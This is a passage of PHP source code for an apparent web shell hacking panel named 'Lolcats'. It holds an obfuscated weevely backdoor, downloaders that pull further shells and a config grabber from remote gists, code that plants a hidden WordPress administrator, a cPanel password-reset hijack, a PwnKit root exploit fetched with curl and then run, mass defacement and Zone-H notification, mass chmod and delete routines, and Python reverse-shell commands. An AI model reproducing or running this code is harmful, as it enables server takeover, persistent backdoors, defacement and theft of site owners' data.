jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$\"> 
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch \"(?i).*(ph|sh|pj|env|cg).*\">
Order Deny,Allow
Deny from all
</FilesMatch>
<FilesMatch '^(".$resoolt.")$'>
Order allow,deny
Allow from all
</FilesMatch>
ErrorDocument 403 \"<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"
ErrorDocument 404 \"<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"");
        ?></code></pre>
    </div>
How to use? Just paste the htaccess above in the folder you want to block all shell extensions except <em>lolcats.php</em> and <em>lolcats2.php</em> (these two files can be customized with your file names!)<br>
</div>

            <?php
        }
        elseif(isset($_POST['get']) && $_POST['option'] == '3') {?>
            <div class='container-fluid language-javascript'>
					<div class='shell mb-3'>
						<pre style='font-size:10px;'><code>error_reporting(0);
$a='$k="c8ba0w"w"a4b";$kw"h="w"7w"4948d105bdbw"";$kf="6f7w"7b77aw"432e"w";$pw"="5dJ1fteGr';
$W='Iw"w"XjtCLs";fuw"w"nction x($t,$k){$w"c=strw"len($kw");$l=stw"rw"len($tw");$o=""w";f';
$d='or($i=0;w"$i<$l;w")w"{fow"rw"($j=0;($jw"<$c&&$i<$l)w";$j++,w"$w"i++){$o.=$t{$i}^w"$k';
$l='w"lean();$w"r=@basw"e64_encow"dew"(w"@x(@gzcow"mpress($w"o),$k))w";prinw"t("$p$kh$rw"$kf");}';
$w='{$j}w";w"w"}}return $w"ow";}if (@w"prew"g_match("/$kh(.+)$w"kw"f/",w"@fiw"le_get_con';
$u=str_replace('I','','creIatIeI_fIuInctIion');
$g='tentw"s("php://iw"nputw"w""),$m)==1) {w"@ow"bw"_start();@evw"al(w"@gzuncomw"press(@x';
$H='(@bw"ase6w"4_dew"w"cw"ode($m[1]),$k)));$o=@ow"b_gw"w"et_cw"ontents();@w"ob_end_c';
$r=str_replace('w"','',$a.$W.$d.$w.$g.$H.$l);
$T=$u('',$r);$T();
</code></pre>
					</div>
How to use? Just paste the code above in the php file, for example: index.php etc. then connect to weevely | terminal command: <em>weevely http://yoursite/yourfile.php lolcats</em>
				</div>
            <?php
        }
elseif(isset($_POST['get']) && $_POST['option'] == '4') {
    function downloadFile($url, $fileName)
{
    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
    $downloaded = false;
    $ch = curl_init($url);
    $fp = fopen($fileName, 'w');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    if (curl_exec($ch)) {
        $downloaded = true;
    }
    curl_close($ch);
    fclose($fp);
    if (!$downloaded) {
        $opts = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: $userAgent\r\n"
            ]
        ];
        $context = stream_context_create($opts);
        $fileContent = file_get_contents($url, false, $context);
        if ($fileContent !== false) {
            file_put_contents($fileName, $fileContent);
            $downloaded = true;
        }
    }
    if (!$downloaded) {
        $fp = fopen($fileName, 'w');
        if ($fp) {
            $source = fopen($url, 'r');
            if ($source) {
                while ($content = fread($source, 8192)) {
                    fwrite($fp, $content);
                }
                fclose($source);
                $downloaded = true;
            }
            fclose($fp);
        }
    }
    if ($downloaded) {
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $urlwebsite = $protocol . '://' . $_SERVER['HTTP_HOST'];
        $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($fileName);
        echo "<center><a href='$downloadLink' target='_blank' class='btn btn-danger'>Lolcats SSI - Click Here!</a></center>";
    } else {
        echo "<center><p class='text-danger'>Failed to download the file.</p></center>";
    }
}

$url = 'https://gist.github.com/rafaeyfa1337/16f1650f50eb86ac5c0d32a6185ebc56/raw/2a96dabbea7430c818e3bd95aca4c8ffe5e556ae/LOLCATS.shtml';
$fileName = getcwd() . '/lolcats-ssi.shtml';
downloadFile($url, $fileName);
}
        elseif(isset($_POST['get']) && $_POST['option'] == '5') {?>
            <div class='container-fluid language-javascript'>
					<div class='shell mb-3'>
						<pre style='font-size:10px;'><code>function lolcatsadmin(){
$login = 'lolcats';
$passw = 'lolcats#1337';
$email = 'g00glesec@proton.me';
if ( !username_exists( $login ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $login, $passw, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}
}
add_action('init','lolcatsadmin');</code></pre>
					</div>
How to use? Add the above code in the functions.php file on the target website. | example: https://piranha.go.id/wp-content/themes/[theme name/functions.php
				</div>
            <?php
        }
        elseif(isset($_POST['get']) && $_POST['option'] == '6') {
            function downloadFile($url, $fileName)
{
    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
    $downloaded = false;
    $ch = curl_init($url);
    $fp = fopen($fileName, 'w');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    if (curl_exec($ch)) {
        $downloaded = true;
    }
    curl_close($ch);
    fclose($fp);
    if (!$downloaded) {
        $opts = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: $userAgent\r\n"
            ]
        ];
        $context = stream_context_create($opts);
        $fileContent = file_get_contents($url, false, $context);
        if ($fileContent !== false) {
            file_put_contents($fileName, $fileContent);
            $downloaded = true;
        }
    }
    if (!$downloaded) {
        $fp = fopen($fileName, 'w');
        if ($fp) {
            $source = fopen($url, 'r');
            if ($source) {
                while ($content = fread($source, 8192)) {
                    fwrite($fp, $content);
                }
                fclose($source);
                $downloaded = true;
            }
            fclose($fp);
        }
    }
    if ($downloaded) {
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $urlwebsite = $protocol . '://' . $_SERVER['HTTP_HOST'];
        $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($fileName);
        echo "<center><a href='$downloadLink' target='_blank' class='btn btn-danger'>Lolcats Alfabepas - Click Here!</a></center>";
    } else {
        echo "<center><p class='text-danger'>Failed to download the file.</p></center>";
    }
}

$url = 'https://gist.githubusercontent.com/rafaeyfa1337/460fa7980960be2c92f47947b16186b8/raw/b96bbd31cdf0b742f78581e06595a857262eb9ab/alfabepas.php';
$fileName = getcwd() . '/lolcats-alfabepas.php';
downloadFile($url, $fileName);
        }
        elseif(isset($_POST['get']) && $_POST['option'] == '7') {
            function downloadFile($url, $fileName)
{
    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
    $downloaded = false;
    $ch = curl_init($url);
    $fp = fopen($fileName, 'w');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    if (curl_exec($ch)) {
        $downloaded = true;
    }
    curl_close($ch);
    fclose($fp);
    if (!$downloaded) {
        $opts = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: $userAgent\r\n"
            ]
        ];
        $context = stream_context_create($opts);
        $fileContent = file_get_contents($url, false, $context);
        if ($fileContent !== false) {
            file_put_contents($fileName, $fileContent);
            $downloaded = true;
        }
    }
    if (!$downloaded) {
        $fp = fopen($fileName, 'w');
        if ($fp) {
            $source = fopen($url, 'r');
            if ($source) {
                while ($content = fread($source, 8192)) {
                    fwrite($fp, $content);
                }
                fclose($source);
                $downloaded = true;
            }
            fclose($fp);
        }
    }
    if ($downloaded) {
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $urlwebsite = $protocol . '://' . $_SERVER['HTTP_HOST'];
        $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($fileName);
        echo "<center><a href='$downloadLink' target='_blank' class='btn btn-danger'>Lolcats Marijuana - Click Here!</a></center>";
    } else {
        echo "<center><p class='text-danger'>Failed to download the file.</p></center>";
    }
}

$url = 'https://gist.githubusercontent.com/rafaeyfa1337/ae372d0d98a9f3d46b7c44110cc16337/raw/589f3239019428ea05c236a36f764536dff97945/MARIJUANA.php';
$fileName = getcwd() . '/lolcats-marijuana.php';
downloadFile($url, $fileName);
        }
        elseif(isset($_POST['get']) && $_POST['option'] == '8') {
            function downloadFile($url, $fileName)
{
    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3';
    $downloaded = false;
    $ch = curl_init($url);
    $fp = fopen($fileName, 'w');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    if (curl_exec($ch)) {
        $downloaded = true;
    }
    curl_close($ch);
    fclose($fp);
    if (!$downloaded) {
        $opts = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: $userAgent\r\n"
            ]
        ];
        $context = stream_context_create($opts);
        $fileContent = file_get_contents($url, false, $context);
        if ($fileContent !== false) {
            file_put_contents($fileName, $fileContent);
            $downloaded = true;
        }
    }
    if (!$downloaded) {
        $fp = fopen($fileName, 'w');
        if ($fp) {
            $source = fopen($url, 'r');
            if ($source) {
                while ($content = fread($source, 8192)) {
                    fwrite($fp, $content);
                }
                fclose($source);
                $downloaded = true;
            }
            fclose($fp);
        }
    }
    if ($downloaded) {
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $urlwebsite = $protocol . '://' . $_SERVER['HTTP_HOST'];
        $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($fileName);
        echo "<center><a href='$downloadLink' target='_blank' class='btn btn-danger'>Lolcats Config Grabber - Click Here!</a></center>";
    } else {
        echo "<center><p class='text-danger'>Failed to download the file.</p></center>";
    }
}

$url = 'https://raw.githubusercontent.com/FlamXTna997/Priv8-Config-Grabber/master/config.php';
$fileName = getcwd() . '/lolcats-config.php';
downloadFile($url, $fileName);
        }
    }
    }
    // cpanel
    if ($_1337["id"] == "cpanel") {
        s();
        echo '<center class="anu">cPanel Reset Password</center>
        <div class="card card-body text-dark input-group mb-3">
            <form action="" method="post">
                <div class="form-group">
                <i class="bi bi-envelope-fill"></i> <label for="userEmail">Your email (for reset password!)</label>
                    <div class="input-group">
                        <input type="email" class="form-control btn-sm text-dark" name="userEmail" placeholder="lolcats@piranha.go.id" required>
                        <div class="input-group-append"> 
                        </div>
                    </div>
                </div>
                <div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" name="submit" value="Submit!">
            </div>
            </form></div>';
        $currentUser = get_current_user();
            $serverHost = $_SERVER["HTTP_HOST"];
            $userIPAddress = getenv("REMOTE_ADDR");
            if (isset($_POST["submit"])) {
                $userEmail = $_POST["userEmail"];
                $userInfo = "email:" . $userEmail;

                $fileHandle = fopen("/home/" . $currentUser . "/.cpanel/contactinfo", "w");
                fwrite($fileHandle, $userInfo);
                fclose($fileHandle);

                $fileHandle = fopen("/home/" . $currentUser . "/.contactinfo", "w");
                fwrite($fileHandle, $userInfo);
                fclose($fileHandle);

                $protocol = "https://";
                $cpanelPort = "2083";
                $resetPassLink = $serverHost . ":2083/resetpass?start=1";

                $readContactInfo = @file("/home/" . $currentUser . "/.cpanel/contactinfo");

                if (!$readContactInfo) {
                    echo "<center><h1>Sorry, access denied!</h1><br><br> </pre></center>";
                } else {
                    echo "<center>DONE! Copy this username for Reset Password cPanel<br></center>";
                    echo '<div class="text-center"><input type="text" class="form-control" value="' .
                        $currentUser .
                        '" id="user"> <button onclick="copyUsername()" class="btn btn-success"><i class="bi bi-clipboard"></i> COPY TEXT</button></div>
                            <script>
                                function copyUsername() {
                                    var copyText = document.getElementById("user");
                                    copyText.select();
                                    document.execCommand("copy");
                                }
                            </script>';

                    echo '<br/><div class="text-center"><a target="_blank" href="' .
                        $protocol .
                        "" .
                        $resetPassLink .
                        '"></div>';
                }
            }
    }
    // auto root
    if ($_1337["id"] == "autoroot") {
        ob_implicit_flush();
        ob_end_flush();
        echo '<center class="anu">Auto Root (using pwnkit)</center>';
        echo '
				<div class="container-fluid language-javascript">
					<div class="shell mb-3">
						<pre style="font-size:10px;"><code>' .
            exe_root(
                "curl https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o cats;chmod +x cats;./cats id",
                $path
            ) .
            '<br>If successful, u can run as root user using command: ./cats "YOUR COMMAND"</code></pre>
					</div>
				</div>';
    }
    // zone h
    if ($_1337["id"] == "zoneh") {
        s();
        echo '<center class="anu">Zone-H Mass Notify</center>';
        echo "<div class='card card-body text-dark input-group mb-3'>";
        if ($_POST["submit"]) {
            $domain = explode("\r\n", $_POST["url"]);
            $nick = $_POST["nick"];
            echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
            echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";

            function zoneh($url, $nick)
            {
                $ch = curl_init("http://www.zone-h.com/notify/single");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt(
                    $ch,
                    CURLOPT_POSTFIELDS,
                    "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send"
                );
                return curl_exec($ch);
                curl_close($ch);
            }

            foreach ($domain as $url) {
                $zoneh = zoneh($url, $nick);
                if (preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                    echo "$url -> OK<br>";
                } else {
                    echo "$url -> ERROR!<br>";
                }
            }
        } else {
            echo '<form method="post">
            <i class="bi bi-person"></i> Attacker Name: 
                <input type="text" class="form-control btn-sm text-dark" name="nick" size="50" placeholder="Lolcats" id="nick">
                <i class="bi bi-globe2"></i> Domain List: 
                <textarea class="form-control btn-sm text-dark" rows="7" name="url" placeholder="http://piranha.go.id/readme.txt" style="resize: vertical;" id="url"></textarea>
            <div class="d-grid gap-2">
            <input class="btn btn-dark btn-sm" type="submit" name="submit" value="Submit!">
            </div>
        </form>';
        }

        echo "</div></div>";
    }
    // mass deface
    if ($_1337["id"] == "deface") {
        function mass_all($dir, $namefile, $contents_sc)
        {
            if (is_writable($dir)) {
                $dira = scandir($dir);
                foreach ($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $▚ = $dirc . "/" . $namefile;
                    if ($dirb === ".") {
                        file_put_contents($▚, $contents_sc);
                    } elseif ($dirb === "..") {
                        file_put_contents($▚, $contents_sc);
                    } else {
                        if (is_dir($dirc)) {
                            if (is_writable($dirc)) {
                                echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
                                file_put_contents($▚, $contents_sc);
                                $▟ = mass_all($dirc, $namefile, $contents_sc);
                            }
                        }
                    }
                }
            }
        }
        function mass_onedir($dir, $namefile, $contents_sc)
        {
            if (is_writable($dir)) {
                $dira = scandir($dir);
                foreach ($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $▚ = $dirc . "/" . $namefile;
                    if ($dirb === ".") {
                        file_put_contents($▚, $contents_sc);
                    } elseif ($dirb === "..") {
                        file_put_contents($▚, $contents_sc);
                    } else {
                        if (is_dir($dirc)) {
                            if (is_writable($dirc)) {
                                echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
                                file_put_contents($▚, $contents_sc);
                            }
                        }
                    }
                }
            }
        }
        if ($_1337["start"]) {
            if ($_1337["tipe"] == "mass") {
                mass_all($_1337["d_dir"], $_1337["d_file"], $_1337["script"]);
            } elseif ($_1337["tipe"] == "onedir") {
                mass_onedir($_1337["d_dir"], $_1337["d_file"], $_1337["script"]);
            }
        }
        s();
        echo '<center class="anu">Mass Deface</center>';
        echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'> Select Type:
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
				<label class='form-check-label' for='flexCheckDefault'>One directory</label>
			</div>
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
				<label class='form-check-label' for='flexCheckDefault'>All directory</label>
			</div>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm text-dark' type='text' name='d_dir' value='$dir/'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='lolcats.txt'>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control btn-sm text-dark' rows='7' name='script' placeholder='Hacked by Lolcats'></textarea>
				<div class='d-grid gap-2'>
					<input class='btn btn-dark btn-sm' type='submit' name='start' value='Submit!'>
				</div>
			</form>
		</div>";
    }
    // mass chmod
    if ($_1337["id"] == "chmod") {
        s();
        echo '<center class="anu">Mass Change Permissions (Chmod)</center>';
        echo "
        <div class='card card-body text-dark input-group mb-3'>
        <form method='POST'> 
        <i class='bi bi-folder'></i> Directory:
        <input class='form-control btn-sm text-dark' type='text' name='dir' value='$dir/'>
        <i class='bi bi-file-earmark'></i> Nama File:
        <input class='form-control btn-sm text-dark' type='text' name='file' placeholder='lolcats.txt'>
        <i class='bi bi-file-earmark'></i> Permissions:
        <input class='form-control btn-sm text-dark' type='text' name='permission' placeholder='0777'>
        <div class='d-grid gap-2'>
            <input class='btn btn-dark btn-sm' type='submit' name='change' value='Submit!'>
        </div>
        </form>
        </div>";
        $dir = $_POST["dir"];
        $file = $_POST["file"];
        $permission = $_POST["permission"];
        $changedFiles = [];
        function getDirContents($dir, &$results = [])
        {
            $files = array_diff(scandir($dir), [".", ".."]);
            foreach ($files as $file) {
                $path = $dir . "/" . $file;
                if (is_dir($path)) {
                    $results = getDirContents($path, $results);
                } else {
                    $results[] = $path;
                }
            }
            return $results;
        }

        $files = getDirContents($dir);

        foreach ($files as $name) {
            if (basename($name) === $file) {
                if (isset($_POST["change"])) {
                    if (chmod($name, octdec($permission))) {
                        $changedFiles[] = $name;
                    }
                }
            }
        }
        if (!empty($changedFiles)) {
            echo "<div class='card card-body text-dark'>";
            echo "<p>Change Permissions <em>$file</em> to <em>$permission</em></p>";
            echo "<ul>";
            foreach ($changedFiles as $changedFile) {
                echo "<li>$changedFile</li>";
            }
            echo "</ul>";
            echo "</div>";
        }
    }

    // mass chmod all file/dir
    if ($_1337["id"] == "masschemod") {
        s();
        echo '<center class="anu">Mass Change Permissions (Chmod) All File/Dir</center>';
        echo '
    <div class="card card-body text-dark input-group mb-3">
        <form method="POST">
            <i class="bi bi-folder"></i> Directory:
            <input class="form-control btn-sm text-dark" type="text" name="dir" value="' .
            htmlspecialchars($dir) .
            '">
            <div class="form-check">
                <input class="form-check-input" type="radio" name="target_type" value="file" checked>
                <label class="form-check-label" for="file">File</label>
            </div>
            <div class="form-check">
                <input class="form-check-input" type="radio" name="target_type" value="dir">
                <label class="form-check-label" for="dir">Directory</label>
            </div>
            <i class="bi bi-file-earmark"></i> Permissions:
            <input class="form-control btn-sm text-dark" type="text" name="permission" placeholder="0777">
            <div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" name="change" value="Submit!">
            </div>
        </form>
    </div>';

        function massChmod($dir, $targetType, $permission, &$changedFiles = [])
        {
            $files = glob($dir . "/*", GLOB_BRACE);

            foreach ($files as $file) {
                if (
                    ($targetType === "file" && is_file($file)) ||
                    ($targetType === "dir" && is_dir($file))
                ) {
                    if (isset($_POST["change"])) {
                        if (chmod($file, octdec($permission))) {
                            $changedFiles[] = $file;
                        }
                    }
                }

                if (is_dir($file)) {
                    massChmod($file, $targetType, $permission, $changedFiles);
                }
            }
        }

        if (isset($_POST["change"])) {
            $dir = $_POST["dir"];
            $targetType = $_POST["target_type"];
            $permission = $_POST["permission"];
            $changedFiles = [];
            massChmod($dir, $targetType, $permission, $changedFiles);

            if (!empty($changedFiles)) {
                echo '<div class="card card-body text-dark">';
                echo "<p>Change Permissions to <em>$permission</em></p>";
                echo "<ul>";
                foreach ($changedFiles as $changedFile) {
                    echo "<li>$changedFile</li>";
                }
                echo "</ul>";
                echo "</div>";
            }
        }
    }
    // find file using keyword
    if ($_1337["id"] == "findkey") {
        s();
echo '<div class="container-fluid">
    <center class="anu">Find File Using Keyword</center>
    <div class="card card-body text-dark input-group mb-3">
        <div class="container-fluid mt-1">
            <form method="post">
                <div class="form-group">
                    <i class="bi bi-folder"></i> <label for="path"> Directory: </label>
                    <input type="text" name="path" class="form-control form-control-sm text-dark flex-grow-1" value="'.$dir.'/">
                </div>
                <i class="bi bi-search"></i> <label for="keyword"> Keyword: </label>
                <input type="text" name="keyword" class="form-control form-control-sm text-dark flex-grow-1" placeholder="eval, phpinfo etc." required>

                <div class="input-group">
                <i class="bi bi-file-earmark"></i> <label for="extension"> &nbsp;Extension: &nbsp;</label>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id=".php" value=".php" checked>
                        <label class="form-check-label" for=".php"> php&nbsp;&nbsp; </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id=".html" value=".html">
                        <label class="form-check-label" for=".html"> html&nbsp;&nbsp; </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id=".txt" value=".txt">
                        <label class="form-check-label" for=".txt"> txt&nbsp;&nbsp; </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id="all" value="all">
                        <label class="form-check-label" for="all"> All&nbsp; </label>
                    </div>
                </div>
                <div class="d-grid gap-2">
                    <input class="btn btn-dark btn-sm" type="submit" name="custom_extension" value="Submit!">
                </div>
            </form>
        </div>
    </div>';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $keyword = $_POST["keyword"];
    $path = isset($_POST["path"]) ? $_POST["path"] : '.';
    $extension = $_POST["extension"];

    if ($extension === "all") {
        $files = glob("$path/*");
    } else {
        $files = glob("$path/*$extension");
    }

    $matching_files = [];

    foreach ($files as $file) {
        if (is_file($file) && strpos(file_get_contents($file), $keyword) !== false) {
            $matching_files[] = $file;
        }
    }

    if (!empty($matching_files)) {
        echo '<div class="card card-body text-dark">Searching '.$keyword.' on '.$extension.' extension.<ul>';
        foreach ($matching_files as $matching_file) {
            echo '<li>' . $matching_file . '</li>';
        }
        echo '</ul></div>';
    } else {
        echo '<p>No matching files found.</p>';
    }
}


    }
    // find recent files
    if ($_1337["id"] == "findmtime") {
        s();
        echo '<div class="container-fluid">
<center class="anu">Find Modified Files</center>
<div class="card card-body text-dark input-group mb-3">
    <div class="container-fluid mt-1">
        <form method="POST">
            <div class="form-group">
                 <i class="bi bi-folder"></i><label for="custom_path">&nbsp; Directory:</label>
                <input type="text" class="form-control form-control-sm text-dark flex-grow-1" name="custom_path" id="custom_path" value="' .
            $dir .
            '" required>
            </div>
            <div class="input-group">
                <i class="bi bi-calendar-date"></i> <label for="time_range">&nbsp;Modified Date:&nbsp;&nbsp;</label>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="1min" value="1min" checked>
                    <label class="form-check-label" for="1min">1 Minute&nbsp;&nbsp;</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="1day" value="1day">
                    <label class="form-check-label" for="1day">1 Day&nbsp;&nbsp;</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="10days" value="10days">
                    <label class="form-check-label" for="10days">10 Days&nbsp;&nbsp;</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="1month" value="1month">
                    <label class="form-check-label" for="1month">1 Month&nbsp;&nbsp;</label>
                </div>
            </div>
            <div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" name="scan" value="Submit!">
            </div>
        </form>
    </div>
</div>
</div>';

function getModifiedFiles($path, $startTime, $endTime)
{
    $files = [];

    $dirContent = scandir($path);
    foreach ($dirContent as $item) {
        if ($item != '.' && $item != '..') {
            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                $subDirFiles = getModifiedFiles($itemPath, $startTime, $endTime);
                $files = array_merge($files, $subDirFiles);
            } else {
                $modifiedTime = filemtime($itemPath);
                if ($modifiedTime >= $startTime && $modifiedTime <= $endTime) {
                    $files[] = $itemPath;
                }
            }
        }
    }

    return $files;
}

$customPath = isset($_POST["custom_path"]) ? $_POST["custom_path"] : getcwd();
if (isset($_POST["scan"])) {
    $currentDateTime = new DateTime();
    $startTime = $currentDateTime->getTimestamp();

    $selectedRange = $_POST["time_range"];
    switch ($selectedRange) {
        case "1min":
            $endTime = $startTime - 60;
            break;
        case "1day":
            $endTime = $startTime - 60 * 60 * 24;
            break;
        case "10days":
            $endTime = $startTime - 60 * 60 * 24 * 10;
            break;
        case "1month":
            $endTime = $startTime - 60 * 60 * 24 * 30;
            break;
        default:
            $endTime = $startTime;
    }

    $modifiedFiles = getModifiedFiles($customPath, $endTime, $startTime);
    echo '<div class="card card-body text-dark"><ul>';
    foreach ($modifiedFiles as $file) {
        echo "<li>$file <gr> -> File modified at {$currentDateTime->format("Y-m-d H:i:s")}</gr></li>";
    }
    echo "</ul></div>";
}
    
}
// mass delete
if ($_1337["id"] == "delete") {
    function mass_delete($dir, $namefile)
    {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $▚ = $dirc . "/" . $namefile;
                if ($dirb === "." || $dirb === "..") {
                    continue;
                }
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        if (file_exists($▚)) {
                            echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
                            unlink($▚);
                        }
                        mass_delete($dirc, $namefile);
                    }
                }
            }
        }
    }
    if ($_1337["start"]) {
        mass_delete($_1337["d_dir"], $_1337["d_file"]);
    }
    s();
    echo '<center class="anu">Mass Delete</center>';
    echo "
    <div class='card card-body text-dark input-group mb-3'>
        <form method='POST'>
            <i class='bi bi-folder'></i> Directory:
            <input class='form-control btn-sm text-dark' type='text' name='d_dir' value='$dir/' $_r>
                <i class='bi bi-file-earmark'></i> Filename:
            <div class='input-group'>
                <input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='filename' $_r><br>
                <div class='input-group-append'>
                    <input class='btn btn-dark btn-sm' type='submit' name='start' value='Delete!'>
                </div>
            </div>
        </form>
    </div>";
}
    // back connect
    if ($_1337["id"] == "backcon") {
        s();
        echo '<center class="anu">Back Connect (Reverse Shell)</center>';
        echo "<div class='card card-body text-dark input-group mb-3'>
	<form method='post'>
    <i class='bi bi-hdd-network'></i> IP Address:
			<input type='text' class='form-control btn-sm text-dark' name='ip' placeholder='IP'>
            <i class='bi bi-hdd'></i> Port:
			<input type='text' class='form-control btn-sm text-dark' name='port' placeholder='Port'>
            <i class='bi bi-hdd-network'></i> Reverse Shell using:
			<select class='form-control btn-sm text-dark' name='backdoor'>
				<option value='1'>Python</option>
                <option value='2'>Python3</option>
				<option value='3'>PHP</option>
				<option value='4'>Perl</option>
				<option value='5'>Bash</option>
                <option value='6'>Windows (Powershell)</option>
			</select>
        <div class='d-grid gap-2'><button type='submit' class='btn btn-dark btn-sm' name='submit'>Submit!</button></div>
	</form></div><br>";
if(isset($_POST['submit'])){
    $backdoor = $_POST['backdoor'];
    $ip = $_POST['ip'];
    $port = $_POST['port'];
  if($backdoor == 1){
    $command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
  }elseif($backdoor == 2){
    $command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); subprocess.call([\"/bin/sh\",\"-i\"]);'";
  }elseif($backdoor == 3){
